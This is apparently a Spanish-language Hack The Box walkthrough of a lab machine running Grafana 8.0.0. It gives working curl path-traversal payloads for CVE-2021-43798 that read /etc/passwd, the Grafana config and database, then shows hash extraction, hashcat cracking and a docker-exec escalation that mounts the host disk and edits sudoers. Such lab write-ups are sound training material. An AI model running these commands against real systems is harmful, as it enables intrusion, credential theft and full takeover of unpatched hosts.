<img width="226" height="112" alt="image" src="https://github.com/user-attachments/assets/c091626e-a558-49d7-b312-78caf7886c9c" />

Comenzamos con la búsqueda de puertoa abiertos para ver por donde comenzar el ataque, como es costumbre en máquinas de HTB, primero debemos conseguir credenciales para poder ingresar por el servicio ssh
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA)
|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA)
|_  256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519)
3000/tcp open  http    Grafana http
| http-robots.txt: 1 disallowed entry 
|_/
| http-title: Grafana
|_Requested resource was /login
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nos dirigimos al puerto 300 en donde se visualiza que usa Grafana con una v8.0.0
<img width="1385" height="818" alt="image" src="https://github.com/user-attachments/assets/47698227-0c7a-4d45-8b18-11c74ad41caf" />


Buscando sobre esta versión vemos que es vulnerable ah Path Traversal
<img width="1434" height="816" alt="image" src="https://github.com/user-attachments/assets/14e159fd-c141-4c93-87c5-818b9630319e" />


El CVE es CVE-2021-43798 y mandamos un payload para comprobar si es vulnerable
```
curl --path-as-is http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd
```

Una vez confirmado la vulnerabilidad revisamos en los puertos conocidos su configuración del servicio
```
curl --path-as-is http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../../../etc/grafana/grafana.ini
```
Dentro de la condiguración encontramos path y una base de datos en sqlite que podemos extraer
```
#################################### Paths ####################################
[paths]
# Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used)
;data = /var/lib/grafana
...SNIP...
# For "sqlite3" only, path relative to data_path setting
;path = grafana.db
```
Ejecutamos el payload para extraer la DB
```
curl --path-as-is http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../../../var/lib/grafana/grafana.db --output grafana.db
```

Revisamos la base de datos para extraer credenciales, en donde encontramos de dos usuarios que son Admin y Boris, mayormente no se puede desencriptar la contraseña de Admin asi que pasamo a Boris
 ```
sqlite3 grafana.db
.tables
SELECT * FROM user;
```

En la web busco información de como Grafana encripta sus contraseñas en la base de datos y sigue el siguiente formato (donde mayormente iteraciones = 10000)
```
sha256:iteraciones:sal_en_base64:hash_en_base64
```

Transformamos los datos correspondientes en base64 y guardamos el hash
```
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=
```
Usamos para desencriptar ```hashcat -m 10900 -a 0 boris.hash /usr/share/wordlist/rockyou.txt```

Credenciales Boris / beautiful1

Una vez adentro buscamos la manera de escalar privilegios y ejecutamos el comando
```
sudo -l
(root) NOPASSWD: /snap/bin/docker exec *
```

Buscamos si hay un contenedor ejecutandose para poder usarlo
```
boris@data:~$ ps auxww | grep docker
root       986  0.0  3.9 1422500 80308 ?       Ssl  02:13   0:02 dockerd --group docker --exec-root=/run/snap.docker --data-root=/var/snap/docker/common/var-lib-docker --pidfile=/run/snap.docker/docker.pid --config-file=/var/snap/docker/1125/config/daemon.json
root      1222  0.1  2.1 1351056 44140 ?       Ssl  02:13   0:02 containerd --config /run/snap.docker/containerd/containerd.toml --log-level error
root      1518  0.0  0.1 1078724 3316 ?        Sl   02:13   0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
root      1523  0.0  0.1 1152712 3248 ?        Sl   02:13   0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip :: -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
root      1539  0.0  0.4 713120  8676 ?        Sl   02:13   0:00 /snap/docker/1125/bin/containerd-shim-runc-v2 -namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 -address /run/snap.docker/containerd/containerd.sock
472       1560  0.0  3.1 776600 63724 ?        Ssl  02:13   0:02 grafana-server --homepath=/usr/share/grafana --config=/etc/grafana/grafana.ini --packaging=docker cfg:default.log.mode=console cfg:default.paths.data=/var/lib/grafana cfg:default.paths.logs=/var/log/grafana cfg:default.paths.plugins=/var/lib/grafana/plugins cfg:default.paths.provisioning=/etc/grafana/provisioning
boris     9991  0.0  0.0  14860  1156 pts/0    S+   03:00   0:00 grep --color=auto docker
```

Visualizamos como esta montado el sistema
```
boris@data:~$ mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=1001016k,nr_inodes=250254,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=203120k,mode=755)
/dev/sda1 on / type ext4 (rw,relatime)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=25,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=12492)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
mqueue on /dev/mqueue type mqueue (rw,relatime)
configfs on /sys/kernel/config type configfs (rw,relatime)
fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)
/var/lib/snapd/snaps/amazon-ssm-agent_4046.snap on /snap/amazon-ssm-agent/4046 type squashfs (ro,nodev,relatime,x-gdu.hide)
/var/lib/snapd/snaps/snapd_14066.snap on /snap/snapd/14066 type squashfs (ro,nodev,relatime,x-gdu.hide)
/var/lib/snapd/snaps/core18_2253.snap on /snap/core18/2253 type squashfs (ro,nodev,relatime,x-gdu.hide)
/var/lib/snapd/snaps/docker_1125.snap on /snap/docker/1125 type squashfs (ro,nodev,relatime,x-gdu.hide)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime)
lxcfs on /var/lib/lxcfs type fuse.lxcfs (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)
tmpfs on /run/snapd/ns type tmpfs (rw,nosuid,noexec,relatime,size=203120k,mode=755)
nsfs on /run/snapd/ns/docker.mnt type nsfs (rw)
tmpfs on /run/user/1001 type tmpfs (rw,nosuid,nodev,relatime,size=203116k,mode=700,uid=1001,gid=1001)
```

Entramos al contener con los privilegios de root que tenemos
```
sudo docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 bash
```
Montamos el systema en el siguiente apartado para poder editar su sudoers y poder convertirnos en root
```
bash-5.1# mount /dev/sda1 /mnt/
bash-5.1# echo "boris ALL = (root) NOPASSWD: /bin/bash" >> /mnt/etc/sudoers

```
